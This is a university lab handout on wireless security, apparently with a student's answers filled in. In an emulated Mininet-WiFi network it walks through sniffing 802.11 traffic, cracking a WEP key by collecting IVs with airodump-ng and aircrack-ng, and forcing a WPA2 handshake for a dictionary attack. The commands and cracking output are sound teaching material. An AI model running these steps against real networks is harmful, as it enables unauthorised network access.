# Wireless security

### Laboratory for the class “Cybersecurity” (01UDR)

### Politecnico di Torino – AA 2021/

### Prof. Antonio Lioy

### prepared by:

### Diana Berbecaru (diana.berbecaru@polito.it)

### Andrea Atzeni (andrea.atzeni@polito.it)

### v. 1.2 (04/11/2021)

## Contents

1 Purpose of this laboratory 1

```
1.1 Additional software tools..................................... 1
1.2 Additional (useful) commands.................................. 2
```
2 Mininet-Wifi 4

```
2.1 Mininet WiFi set-up and basic operations............................ 4
2.2 Experiment with a simple wireless topology........................... 5
2.3 Sniffing on a Wireless network.................................. 6
2.4 WEP connections......................................... 8
2.5 WEP attack............................................ 9
2.5.1 IV collision problem................................... 9
2.6 WPA2 connections........................................ 10
2.7 WPA attacks........................................... 13
2.7.1 Dictionary attack..................................... 13
```
## 1 Purpose of this laboratory

In this laboratory, you will perform exercises aimed to experiment with wireless networks tools to understand
in more detail their working principles.

### 1.1 Additional software tools

The tools listed below will be used as well throughout this laboratory:

Wireshark- is an open-source tool (having a user-friendly graphical interface) which allows capturing network
traffic.
Home page =https://www.wireshark.org/


### 1.2 Additional (useful) commands

To experiment with a wireless network, the commands to manipulate the wireless network card can be useful

iwconfig- is a command-line program to get and set wireless network card parameters (like, for example, the
network SSID). Its purpose is somehow similar to theifconfigcommand for the wireless case.
NOTE
This command has been very relevant in the past, but it may not fully interoperate with modern
Linux wireless network driver (e.g. nl80211 family). So it is shown here for completeness (and
in many tutorials you still can find it) but you should prefer the next one.

## IW

```
iwis a replacement ofiwconfigfor modern drivers. it provides the same functionalities ofiwconfig,
but with different command syntax and improved compatibility with modern hardware.
iw [option]command
whereoptioncan be, among the others
```
```
--versionprint version information and exit
```
```
--debugto enable netlink message debugging.
```
```
and most relevantcommandsfor this laboratory can be:
```
```
help [command]to print usage for all or a specific command, e.g. ”help wowlan” or ”help wowlan
enable”
```
```
devdevnameinfoto show information fordevnameinterface
```
```
devdevnamelinkto show information for wireless connections associated todevname
```
```
devdevnameconnect ESSIDto connectdevnameinterface to theESSIDwireless LAN
```
```
devdevnamedisconnectto disconnectdevnamefrom an AP.
```
## Aircrack-ng suite

```
TheAircrack-ng suiteis a set of open-source command-line tools to monitor, attack, test and crack
802.11 WEP and WPA networks. in the following we will mention the most useful for this laboratory
(but feel free to explore more of them and more in depth the ones presented). Home page =https:
//www.aircrack-ng.org/.
airmon-ng [cmd]interface[channel]
This script enables and disables the monitor mode on wireless interfaces. Without parameters, it will
show the available interfaces. Another brutal task often accomplished is to kill programs that can inter-
fere with the wireless card operation in background (and list them beforehand).
cmdmay be one ofstart,stopandcheck.startenables the monitor mode on the wirelessinterface
(on the wirelesschannelif specified),stopdisables the monitor mode on theinterface, whilecheck
is involved in the list and kill of other process that can modify the wireless card in background and
interfere with the behaviour ofairmon.
```

#### NOTE

```
The wireless interface used instartandstopis tipically different, sinceairmoncreates a new
interface withmonat the end to use for the monitor mode, and disables the old one. sostart
uses the original, whilestopuses the new one (with ’mon’ suffix)
```
```
airodump-ng [options]interface [,interface,...]
airodump-ngis used for sniffing of raw 802.11 frames. Typical use of the sniffed result is input for
aircrack-ng.
optionsrelevant for this laboratory are:
```
- -wprefixindicates the prefix of the dump files containing the sniffed result.Airodumpcaptures
    the packet and also creates a set of files suitable for further operations. All these files share the
    sameprefix.
- --helpdisplays the usage and available options.

```
aircrack-ng [options]file(s)
is a command-line tool to crack WEP/WPA-PSK key
optionsrelevant for this laboratory are
```
- -wdictionaryspecifies a path to a dictionary file for wpa cracking. Can be specified “-” to use
    stdin. A list of relevant wordlists can be found athttp://www.aircrack-ng.org/doku.php?
    id=faq#where_can_i_find_good_wordlists
- --helpdisplays the usage and available options

while thefile(s)are files with the captured packets that aircrack-ng can work on offline

## Mininet-wifi

```
Mininetis a network emulator which creates a network of virtual hosts, switches, controllers, and links.
Mininet networks run real code, like Linux network applications as well as the real Linux kernel and
network stack. Mininet is a powerful way to experiment with networks, but the limitation of the original
version is that it does not support Wireless networks.
Mininet-WiFi is a fork of the Mininet network emulator, extended by adding virtualized WiFi Stations
and Access Points based on the standard Linux wireless drivers. New components have been added
to support the addition of these wireless devices in a Mininet network scenario and to emulate the
attributes of a mobile station such as position and movement relative to the access points, as well as
security functionalities.
To activatemininet-wifiand create a minimal topology you can run the following command:
sudo mn --wifi [commandopts]
With nocommandoptsit creates a virtual topology with one AP and two wireless stations connected.
Simply by varying the command line option, different topologies can be easily instantiated.
Somecommandoptsrelevant for this laboratory are:
```
- -h, --helpshow the help message with the list of possible options
- --topo=TOPO[,param]whereTOPOcan assume many possible value according to possible
    topology (singleis for a topology with a single access point and all stations connected to it,
    and the optionalparamcan be the number of desired stations)


- -vVERBOSITY, --verbosity=VERBOSITYwhereVERBOSITYcan be one ofdebug, info,
    output, warning, error, critical(most detaileddebug)
- -xspawn xterm command shells for each node
- -cclean possible interrupted and dirty instations of Mininet-wifi. Since it is an experimental
    project, it can become unstable and need some clean-up from time to time (if you experience
    some “strange” behaviour, try this command)

## 2 Mininet-Wifi

### 2.1 Mininet WiFi set-up and basic operations

For this laboratory, you will have to simulate the presence of a simple wireless network throughMininet-Wifi.
First step is to download a lightweight VM specifically shaped for runningMininet-Wifi. You can download
from the original site at

- https://mininet-wifi.github.io/get-started/

or from the internal Torsec storage server (which is the preferred option at Labinf) at

- https://storage-sec.polito.it/external/kali/2021/mn-wifi-vm.ova

Then you can import it in a Virtualbox, repeating the same steps explained for importing a Kali VM (re-
fer tolab00for details) and finally you can start the VM in Virtual Box where you should see the initial
Mininet-Wifiscreen, as shown in Fig. 1 (note that the background image can change according to the ver-
sion, but the instructions remain valid)

```
Figure 1: Initial Mininet-Wifi screen.
```

Now, you can open a command shell (we suggest to open “QTerminal” as shown in Fig. 2, since it is one of
the most user-friendly available in this environment) and be ready to create your virtual but realistic wireless
network.

```
Figure 2: Opening a QTerminal in Mininet-Wifi screen.
```
### 2.2 Experiment with a simple wireless topology

In the opened terminal, to create a WLAN, run the following command

‑E The ‑E (preserve environment) option indicates to the security policy that the user wishes to preserve their existing environment variables. The security policy may return an error if the ‑E option is specified and the user does not have permission to preserve the environment.

--topo=TOPO[,param] where TOPO can  assume  many  possible  value  according  to  possibletopology (single is for a topology with a single access point and all stations connected to it,and the optional param can be the number of desired stations)

-xspawn xterm command shells for each node

```
sudo -E mn --wifi --topo=single,3 -x
```
When asked for the password, insert the “wifi”.

According to the result of command, which set-up a wireless network, what kind of topology do you guess
Mininet-Wifi created?

```
→ 1 AP, 3 stations connected to it, 1 OpenFlow reference controller (An SDN controller is the strategic point in software-defined networking (SDN). An OpenFlow Controller uses the OpenFlow protocol to connect and configure network devices (routers, switches, etc.) to determine the best path for application traffic.)
mininet-wifi> nodes
available nodes are: 
ap1 c0 sta1 sta2 sta3

```
Any of the five created terminals can act as the control shell of a different virtual node. Using the usual
terminal ip command to query the network parameters, can you identify the different wireless interfaces and
the respective addresses of the nodes?


| name | address                      | wireless interface |
| ---- | ---------------------------- | ------------------ |
| sta1 | 10.0.0.1/8 02:00:00:00:00:00 | sta1-wlan0         |
| sta2 | 10.0.0.2/8 02:00:00:00:01:00 | sta2-wlan0         |
| sta3 | 10.0.0.3/8 02:00:00:00:02:00 | sta3-wlan0         |
| ap1  | 02:00:00:00:03:00            | ap1-wlan1          |
| c0   | 02:00:00:00:03:00            | ap1-wlan1          |

In any terminal, you can run the following command to see the characteristics of the wifi interface:

```
iw iwface info
```
whereiwfacestands for the wifi interface in the specific terminal. For example, in the terminal forsta1you
would run:

```
iw sta1-wlan0 info
Interface sta1-wlan0
	ifindex 5
	wdev 0x1
	addr 02:00:00:00:00:00
	ssid my-ssid
	type managed
	wiphy 0
	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
	txpower 14.00 dBm

iw ap1-wlain1 info
    Interface ap1-wlan1
	ifindex 8
	wdev 0x300000001
	addr 02:00:00:00:03:00
	ssid my-ssid
	type AP
	wiphy 3
	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
	txpower 14.00 dBm


```
or if you want to concentrate on the link characteristics

```
iw sta1-wlan0 link
Connected to 02:00:00:00:03:00 (on sta1-wlan0)
	SSID: my-ssid
	freq: 2412
	RX: 961570 bytes (22048 packets)
	TX: 5052 bytes (51 packets)
	signal: -36 dBm
	tx bitrate: 48.0 MBit/s

	bss flags:	short-slot-time
	dtim period:	2
	beacon int:	100

iw sta1-ap1 link
    Not connected.
```
You can note the interface type (set to “managed” in the stations and to “master” (AP) in the Access Point terminal), as well as the SSID of the network (“my-ssid”).

Now, initiate the transfer of some packets between two stations, e.g. you can runpingcommands fromsta
tosta2, using the terminal ofsta1with the command:

```
ping IPaddresssta
```
How you could identify and analyse the packets exchanged between the two stations? What is the data length
of a transmitted packet?

```
→ 98 Bytes, with only 48 being the icmp data field.
```
What kind of protocol has been used at layer 2?

```
→ Ethernet
```
Since you have three nodes, try also to runwiresharkonsta3when pingingsta1andsta2. Can you see the
packet exchange?

```
→ No, I can just see the ARP request from sta1 to sta2
```
### 2.3 Sniffing on a Wireless network

In the previous point, you should have noticed that many details of a Wireless communication are hidden in a
“normal” sniffing on a wireless card. If you want to access actual details of a 802.11 exchange, you have to put
your interface in monitor mode.

For example, you can transform sta3 in a network sensor. To do that, in sta3 command shell create a wifi interface in “monitor mode” exploiting the functionalities of airmon tool: run the command

```
airmon-ng start sta3-wlan0
root@wifi-virtualbox:~# airmon-ng start sta3-wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    547 avahi-daemon
    551 NetworkManager
    576 wpa_supplicant
    582 avahi-daemon

PHY     Interface       Driver          Chipset

null    802.11          ??????          non-mac80211 device? (report this!)
null    ESSID:"my-ssid" ??????          non-mac80211 device? (report this!)
null    IEEE            ??????          non-mac80211 device? (report this!)
mn01860p02s02   sta3-wlan0      mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
rfkill error: rfkill: invalid identifier: 3

2: mn01860p02s02: Wireless LAN
        Soft blocked: no
        Hard blocked: no
rfkill error, unable to start sta3-wlan0

Would you like to try and automatically resolve this? [y/n] y
rfkill error: rfkill: invalid identifier: 3
Unable to unblock.

                (mac80211 monitor mode vif enabled for [mn01860p02s02]sta3-wlan0 on [mn01860p02s02]sta3-wlan0mon)
                (mac80211 station mode vif disabled for [mn01860p02s02]sta3-wlan0)

```
Press “y” when asked to resolve some issues. In the output, you should see a message stating“(...monitor mode
vif enabled for ...sta3-wlan0mon)”.

If you check the station 3 network interfaces with the commandip addr show, you should see that it has been
created a new interface in monitor mode, called“sta3-wlan0mon”(and the older one has been disabled).

```
2: sta3-wlan0mon: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
```
 In brief, airmon creates an interface with the original wifi interface name (e.g.sta3-wlan) followed by the suffix
“mon” (for monitor mode). You should be able to see the output similar to the one shown in the Fig. 3

Next, insta3restartwireshark, and select thesta3-wlan0moninterface and start capturing packets (Fig. 4).


```
Figure 3: Setting the wifi interface in monitor mode.
```
```
Figure 4: Sniffing 802.11 traffic with wireshark.
```
In this way, you will be able to see 802.11 “real” packets and if you try to pingsta2fromsta1you should see
the captured packets in thewiresharkwindow ofsta3.

Once you have finished, go back to the mininetcli console and run the command:

```
exit
```

as shown in Fig. 5

```
Figure 5: Closing the initial Mininet-WiFi topology.
```
This will close all the terminals corresponding to the five nodes and go back the initial setting.

### 2.4 WEP connections

Now it is time to create a WEP connection and examine it. To do so, you can take advantage of the support mate-
rial, where you can find a python script that can create a suitable network topology. Extractauthentication 3 wep.py
fromCYBlab03support.zipand execute the script with the following command:

```
sudo -E python authentication 3 wep.py
```
That will result in the opening of four terminal windows

In this case, can you derive the resulting network topology?

| name | address                      | wireless interface |
| ---- | ---------------------------- | ------------------ |
| sta1 | 10.0.0.1/8 02:00:00:00:00:00 | sta1-wlan0         |
| sta2 | 10.0.0.2/8 02:00:00:00:01:00 | sta2-wlan0         |
| sta3 | 10.0.0.3/8 02:00:00:00:02:00 | sta3-wlan0         |
| ap1  | 02:00:00:00:03:00            | ap1-wlan1          |

Launch the command “ip addr show” in each terminal, and note the correspondingstaX-wlan0interfaces.

For simplicity, we assume to usesta3to sniff the 802.11 traffic, in particular the traffic exchanged between
sta1andsta2. Thus, go into the terminal corresponding tosta3, and set the wifi interface in monitor mode
and then startwiresharkto be able to see 802.11 traffic sniffed in real time.

We can setup a WEP “secure” connection thanks toiw. You can setup the shared key to be used in a WEP
connection (same for AP and different stations) exploiting the following commands in the respective stations:

```
iw sta1-wlan0 connect simplewifi key d:0:abcdeabcde
```
```
iw sta2-wlan0 connect simplewifi key d:0:abcdeabcde
```
Then ping fromsta1tosta2:


```
ping IPaddresssta
```
Stop the capture, if you want, onsta3and analyse the sniffed traffic.

What kind of differences can you notice in respect of the sniff you performed without WEP?

```
Using wlan.sa==02:00:00:00:00:00 || wlan.sa==02:00:00:00:01:00 filter we can just filter the traffic related to the ping.
Without wep, we can see in clear all the ICMP packets that are being exchanged.
With wep we just see "data", encrypted (at first glance lol)
```
Can you identify the Initialization Vectors inside the communication? Are you able to notice any correlations
between different IVs?
```
IEEE 802.11 Data, Flags: .p.....T
    Type/Subtype: Data (0x0020)
    Frame Control Field: 0x0841
        .... ..00 = Version: 0
        .... 10.. = Type: Data frame (2)
        0000 .... = Subtype: 0
        Flags: 0x41
            .... ..01 = DS status: Frame from STA to DS via an AP (To DS: 1 From DS: 0) (0x1)
            .... .0.. = More Fragments: This is the last fragment
            .... 0... = Retry: Frame is not being retransmitted
            ...0 .... = PWR MGT: STA will stay up
            ..0. .... = More Data: No data buffered
            .1.. .... = Protected flag: Data is protected
            0... .... = Order flag: Not strictly ordered
    .000 0000 0011 0100 = Duration: 52 microseconds
    Receiver address: 02:00:00:00:03:00 (02:00:00:00:03:00)
    Transmitter address: 02:00:00:00:01:00 (02:00:00:00:01:00)
    Destination address: 02:00:00:00:00:00 (02:00:00:00:00:00)
    Source address: 02:00:00:00:01:00 (02:00:00:00:01:00)
    BSS Id: 02:00:00:00:03:00 (02:00:00:00:03:00)
    STA address: 02:00:00:00:01:00 (02:00:00:00:01:00)
    .... .... .... 0000 = Fragment number: 0
    0000 0000 1111 .... = Sequence number: 15
    WEP parameters
        Initialization Vector: 0x004303	<---- HERE IS THE IV
        Key Index: 0
        WEP ICV: 0x6e4bebb1 (not verified)
Data (36 bytes)
    Data: 14ab1d1a5068cd09aa51095fea104f1f4e0fbce9e5b13b9f…
    [Length: 36]

IVs:
sta2 -> sta1 : 0x004303, 0x004304, 0x004305, ... 
sta2 -> sta1 : 0x0082aa34, 0x0082aa36, 0x0082aa38, ...
sta1 -> sta2 : 0x0082aa35, 0x0082aa37, 0x0082aa39, ...
sta1 -> sta2 : 0x1654c1, 0x1654c2, 0x1654c3, ... 

The IVs are progressing 1 by 1.
After A LOT of time (23000 packets, 1600 seconds=26 min) 0x1654e2 progressed to 0x00165b82
```
When finished, typeexitin the Mininet Command-Line interface to shut-down the topology.

### 2.5 WEP attack

2.5.1 IV collision problem

In this excercise we will exploit the short Initialization Vector to derive the key in a WEP exchange.

Re-establish an appropriate wireless topology by exploiting authentication 3 wep.py and iw as in the pre-
vious section Again, let’s use sta3 as monitor (activate it with airmon if needed), then launch airodump with
the following command:

```
airodump-ng --bssid <APMAC> -w <capturefile> sta3-wlan0mon
airodump-ng --bssid 02:00:00:00:03:00 -w iv_collision_attack sta3-wlan0mon

 CH  9 ][ Elapsed: 4 mins ][ 2021-11-25 14:28 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:03:00  -34     2838        0    0   1   54   WEP  WEP         simplewifi                                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:03:00  02:00:00:00:01:00  -35    0 - 1      0        9         simplewifi                                                            
 02:00:00:00:03:00  02:00:00:00:00:00  -35    0 - 1      0        9         simplewifi       

```
This starts a selective sniffing on sta3, where you can notice the sniffed packets and some general parameters of
the wireless network as output of the command. The sniffed packets will be saved in capturefile. The captured
packets will be used as input to try to crack the WEP key.

In the output of airodump, you can notice the number of captured beacon and data packets. According to the
present packet acquisition, how much time do you expect to wait before a significant possibility to discover the
WEP key

```
2800 beacons in 4 min
we need 100000 to have 95% probability of finding repeated ivs. -> 16 min

```
If you generate some packet exchange from sta1 and sta2, e.g. by pinging each other, what changes do you
expect, from the attack perspective?

```
→ more packets that uses the same key with increasing IVs will shorten the time required to reuse the same IV, and be able to perform the two-time pad.
```
Do you think you can do something to speed-up the process?

```
→ Since every station uses the same default key, we can ping from every station to every station = 6x increase in speed
We can also decrease the size of the ping to increase the speed of every message using the -s option of ping:
-s packetsize
          Specifies the number of data bytes to be sent.  The default is 56, which  translates  into
          64 ICMP data bytes when combined with the 8 bytes of ICMP header data.

using ping -f (flood) (23000 packets in 30 seconds!)

using just 2 ping (sta1<->sta2) -f -s 1 we get

 CH 10 ][ Elapsed: 10 mins ][ 2021-11-25 14:34 ][ paused output

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:03:00  -34     6121   393075 2175   1   54   WEP  WEP         simplewifi                                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:03:00  02:00:00:00:01:00  -35   54 -54      0   196643 simplewifi                                                            
 02:00:00:00:03:00  02:00:00:00:00:00  -35   54 -54      0   196461         simplewifi



```
- CH is the channel on which the AP is setup
- BAT is the remaining battery time
- BSSID is the Access Point MAC address
- PWR is the signal power, which depends on the driver
- Beacons is the total number of beacons (Beacon frame is one of the management frames in IEEE 802.11 based WLANs. It contains all the information about the network. Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN and to synchronise the members of the service set. Beacon frames are transmitted by the access point (AP) in an infrastructure basic service set (BSS))
- **Data: Number of captured data packets, including data broadcast packets.**
- MB is the maximum communication speed (the dot mean short preamble).
- ENC is the encryption protocol in use:
OPN = open, WEP? = WEP or WPA (no data), WEP, WPA
- CIPHER: The cipher detected. One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and CCMP is typically used with WPA2.
- AUTH: The authentication protocol used. One of MGT (WPA/WPA2 using a separate authentication server), SKA (shared key for WEP), PSK (pre-shared key for WPA/WPA2), or OPN (open for WEP).
- ESSID is the network identifier
- Lost: The number of data packets lost over the last 10 seconds based on the sequence number. See note below for a more detailed explanation.
- Packets: The number of data packets sent by the client.
- Probes: Then ESSIDs probed by the client.

To perform the actual crack, you can use the following command:

```
aircrack-ng -b 02:00:00:00:03:00 iv_collision_attack
root@wifi-virtualbox:~/Desktop# aircrack-ng -b  02:00:00:00:03:00 iv_collision_attack-01.cap
Reading packets, please wait...
Opening iv_collision_attack-01.cap
Read 608706 packets.

1 potential targets

Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 608631 ivs.
                         KEY FOUND! [ AB:CD:EA:BC:DE ] 
        Decrypted correctly: 100%
```
```
root@wifi-virtualbox:~/Desktop# aircrack-ng -debug -b  02:00:00:00:03:00 iv_collision_attack-01.cap
Reading packets, please wait...
Opening iv_collision_attack-01.cap
Read 608706 packets.

1 potential targets

Aircrack-ng 1.6 

Tested 1 keys (got 608631 IVs)
    KB    depth   byte(vote)
    0    0/  1   AB(1436) A9(  65) 5C(  55) 3C(  45) 9A(  40) 
    1    0/  1   CD( 579) 0C(  46) FE(  45) BC(  33) 14(  23) 
    2    0/  1   EA(  71) 2C(  30) 3C(  16) 05(  14) B1(   8) 
    3    0/  2   BC( 118) 3C(  60) F2(  18) 4B(  16) 9F(  16) 

KEY FOUND! [ AB:CD:EA:BC:DE ] 
	Decrypted correctly: 100%   



```
and check if you have collected a sufficient amount of packets.

https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack

### 2.6 WPA2 connections

Now it is time to create a WPA connection and examine it. To do so, in the support material you can
find a python script that can create a suitable network topology. Extractauthentication 3 wpa.pyfrom
CYBlab03support.zipand execute the script with the following command:

```
sudo -E python authentication_3_wpa.py
```
This command will create a network topology similar with the one in the previous exercise, which is composed
of three stations,sta1,sta2,sta3andAP1, but in this casesta3is not connected to the AP. For the three
stations, 3 terminal windows are opened, as shown in Fig. 6.

```
Figure 6: Mininet-Wifi topology (traffic protected with WPA2).
```
As in the previous exercises, we will usesta3to sniff the 802.11 traffic, in particular the traffic exchanged
betweensta1andsta2.

Also in this case, what is the network topology?

| name | address                      | wireless interface |
| ---- | ---------------------------- | ------------------ |
| sta1 | 10.0.0.1/8 02:00:00:00:00:00 | sta1-wlan0         |
| sta2 | 10.0.0.2/8 02:00:00:00:01:00 | sta2-wlan0         |
| sta3 | 10.0.0.3/8 02:00:00:00:02:00 | sta3-wlan0         |
| ap1  | 02:00:00:00:03:00            | ap1-wlan1          |

Let’s usesta3as monitor (set the wifi interface appropriately). next, runwireshark(you should be able to
see 802.11 traffic sniffed in real time) and then go to thesta1terminal and run a ping command tosta2.

Stop the capture and analyse the sniffed traffic. You should note in thewiresharkwindow ofsta3that you
cannot see anymore ICMP traffic in clear, as the packets have been protected. Are you able to identify with
what kind of protocol?

```
IEEE 802.11 Data, Flags: .p.....T
    Type/Subtype: Data (0x0020)
    Frame Control Field: 0x0841
    .000 0000 1101 0101 = Duration: 213 microseconds
    Receiver address: 02:00:00:00:03:00 (02:00:00:00:03:00)
    Transmitter address: 02:00:00:00:00:00 (02:00:00:00:00:00)
    Destination address: 02:00:00:00:01:00 (02:00:00:00:01:00)
    Source address: 02:00:00:00:00:00 (02:00:00:00:00:00)
    BSS Id: 02:00:00:00:03:00 (02:00:00:00:03:00)
    STA address: 02:00:00:00:00:00 (02:00:00:00:00:00)
    .... .... .... 0000 = Fragment number: 0
    0000 0001 1111 .... = Sequence number: 31
    CCMP parameters <--- CCMP!
        CCMP Ext. Initialization Vector: 0x000000000010
        Key Index: 0
Data (100 bytes)
    Data: 4af875d8f66de574b8c16411ccee3e346ab4d42b7c2f503c…
    [Length: 100]
```

Now, let’s use the wpa command line interface to disconnect and connectsta2to the network

Startwiresharkin thesta3terminal (if not running). Go to the terminal ofsta2, and run:

```
wpacli
```
as shown in Fig. 7.

```
Figure 7: Running wpacli in sta2 terminal.
```
You should see “Interactive mode” and a command line shell. In this shell, run the command:

```
disconnect
```
followed by the command:

```
reconnect
```
as shown in Fig. 8. Then runquitto exit from the interactive command shell insta2.

```
Selected interface 'sta2-wlan0'

Interactive mode

> disconnect
OK
<3>CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:03:00 reason=3 locally_generated=1
> reconnect
OK
<3>CTRL-EVENT-SCAN-STARTED 
<3>CTRL-EVENT-SCAN-RESULTS 
<3>SME: Trying to authenticate with 02:00:00:00:03:00 (SSID='simplewifi' freq=2412 MHz)
<3>Trying to associate with 02:00:00:00:03:00 (SSID='simplewifi' freq=2412 MHz)
<3>Associated with 02:00:00:00:03:00
<3>CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
<3>WPA: Key negotiation completed with 02:00:00:00:03:00 [PTK=CCMP GTK=CCMP]
<3>CTRL-EVENT-CONNECTED - Connection to 02:00:00:00:03:00 completed [id=0 id_str=]
> 
> quit
```

Go to the wireshark window and stop the capture.

What’s the effect, from the network point of view, of the disconnect and reconnect commands?

```
wpa2 deauthentication
wpa2 authentication
wpa2 key
```
Analyse the EAPOL messages (key1,2,3,4) and respond to the following questions:

Where is the authentication information (in which part of the 802.11 packet)?

```
802.1X Authentication, transported by Logical Link Control protocol
```

```
Figure 8: Disconnect and reconnecting to the AP (in sta2).
```
#### →

Where is the value of the Anonce in the 4-way handshake? Who sends the Anonce?

```
The AP sends the Anonce in
    WPA Key Nonce: 1fda21756fb670e1795a1f1455447e3d45caa0c43a3154b6…

```
Where is the value of Snonce in the 4-way handshake? Who sends it?

```
The STA sends its Snonce in
    WPA Key Nonce: 83c85fac0be8c753ae09d372ef3f553c2a78f7f3f3fa2cdb…

```
Which is the RSN IE (Information Element) of the station (in terms of supported Group Cipher Suite and
Authentication Key Management)?

```
This can all be found in the station association request:
Tag: RSN Information
            Tag Number: RSN Information (48)
            Tag length: 20
            RSN Version: 1
    --->    Group Cipher Suite: 00:0f:ac (Ieee 802.11) AES (CCM)
                Group Cipher Suite OUI: 00:0f:ac (Ieee 802.11)
                Group Cipher Suite type: AES (CCM) (4)
            Pairwise Cipher Suite Count: 1
            Pairwise Cipher Suite List 00:0f:ac (Ieee 802.11) AES (CCM)
                Pairwise Cipher Suite: 00:0f:ac (Ieee 802.11) AES (CCM)
                    Pairwise Cipher Suite OUI: 00:0f:ac (Ieee 802.11)
                    Pairwise Cipher Suite type: AES (CCM) (4)
    --->    Auth Key Management (AKM) Suite Count: 1
            Auth Key Management (AKM) List 00:0f:ac (Ieee 802.11) PSK
                Auth Key Management (AKM) Suite: 00:0f:ac (Ieee 802.11) PSK
                    Auth Key Management (AKM) OUI: 00:0f:ac (Ieee 802.11)
                    Auth Key Management (AKM) type: PSK (2)
            RSN Capabilities: 0x0000
                .... .... .... ...0 = RSN Pre-Auth capabilities: Transmitter does not support pre-authentication
                .... .... .... ..0. = RSN No Pairwise capabilities: Transmitter can support WEP default key 0 simultaneously with Pairwise key
                .... .... .... 00.. = RSN PTKSA Replay Counter capabilities: 1 replay counter per PTKSA/GTKSA/STAKeySA (0x0)
                .... .... ..00 .... = RSN GTKSA Replay Counter capabilities: 1 replay counter per PTKSA/GTKSA/STAKeySA (0x0)
                .... .... .0.. .... = Management Frame Protection Required: False
                .... .... 0... .... = Management Frame Protection Capable: False
                .... ...0 .... .... = Joint Multi-band RSNA: False
                .... ..0. .... .... = PeerKey Enabled: False
                ..0. .... .... .... = Extended Key ID for Individually Addressed Frames: Not supported
        
```
Which algorithm has been used for the derivation of the MIC in the Messages 2,3, and 4 of the 4-way handshake
?

```
The algorithm is to derive the mic is HMAC-SHA1.
        .... .... .... .010 = Key Descriptor Version: AES Cipher, HMAC-SHA1 MIC (2)
In key1:
        .... ...0 .... .... = Key MIC: Not set
    WPA Key MIC: 00000000000000000000000000000000
In key2:
        .... ...1 .... .... = Key MIC: Set
    WPA Key MIC: 9cf222e0ff63be04de27677b66a147e8
In key3:
    WPA Key MIC: 2e9940796cd10cecc2e0ee259d85f26c
In key4:
    WPA Key MIC: c4de3bc865aa39bd97f0246c12ddfb6c

```

Where is the enc(GTK) of the 4-way handshake?

```
In key3:
    WPA Key Data: b3cd5b95b850bae5ac3b007ef1a1ae12a74faf76a3a756e1…

```
### 2.7 WPA attacks

2.7.1 Dictionary attack

Insta3, launchairodumpwith the following command:

```
airodump-ng -w filepsk sta3-wlan0mon
```
Wait for a while and observe the traffic intercepted.

Insta2terminal, run again (as in the previous exercise):

```
wpacli
```
In the “Interactive mode” shell run (a couple of times) the command:

```
disconnect
```
and then

```
reconnect
```
In the airodump window, you should note WPA2 (for ENC) and CCMP (for CIPHER).

```
 CH  6 ][ Elapsed: 2 mins ][ 2021-11-26 07:02 ][ WPA handshake: 02:00:00:00:03:00 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:03:00  -34     1432        8    0   1   54   WPA2 CCMP   PSK  simplewifi                                                                                                                                 

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:03:00  02:00:00:00:00:00  -35    0 - 1      0        5         simplewifi                                                                                                                                
 02:00:00:00:03:00  02:00:00:00:01:00  -35    1 - 1      0       16  EAPOL  simplewifi     
```

 Press Ctrl-c to stop
airodump. Airodump has created several files namedfilepsk*, among them there should be a file named
filepsk-01.cap containing the traffic just captured by airodump.

At this point, imagine to be an attacker that wants to perform a dictionary attack on the traffic intercepted
with airodump. Create your own dictionary, by creating a file nameddictionary.txt, and insert in this file
possible passwords (one per line), and see the result (we advice to insert also some pretty common ones, like
“qwerty”, “ 12345 ” “123456789a” “qwertyuiop” (who knows, maybe is one of that...).

Next, insta3launch a dictionary attack withairodump, by executing the command:

```
aircrack-ng -w dictionary.txt filepsk-01.cap
```
If you are lucky, you may see an output similar to the one shown in Fig. 9, indicating that you have found the
right key!


Figure 9: Result of the dictionary attack.

```
Reading packets, please wait...
Opening wpa2_dictionary_attack-01.cap
Read 48 packets.

   #  BSSID              ESSID                     Encryption

   1  02:00:00:00:03:00  simplewifi                WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening wpa2_dictionary_attack-01.cap
Read 48 packets.

1 potential targets
Aircrack-ng 1.6
[00:00:00] 2/4 keys tested (147.97 k/s)
Current passphrase: 123456789a                 
Master Key     :  E0 3D DC 8E 51 FB 0A 35 A6 EE 6D DF 9B 6B 69 EB
                  E8 C0 7B D2 50 95 63 A7 26 43 DD B2 0F 46 E6 21

Transient Key  :  98 E3 74 A4 21 CD B7 88 7E AC 60 E1 DD 65 68 64 
                  CD 8D C5 25 31 EF FD 4F D2 A6 0A 81 A0 44 78 DB 
                  26 6A 27 C0 10 7A 77 AA CD AE 38 92 A5 2E 0E BB 
                  09 B1 0C 3A 83 99 44 98 3F 94 69 39 69 00 00 00
                  
EAPOL HMAC     :  23 7E D5 87 3D FA 9E 66 CA 65 E4 2E C8 7C 09 98 

KEY FOUND! [ 123456789a ]
```
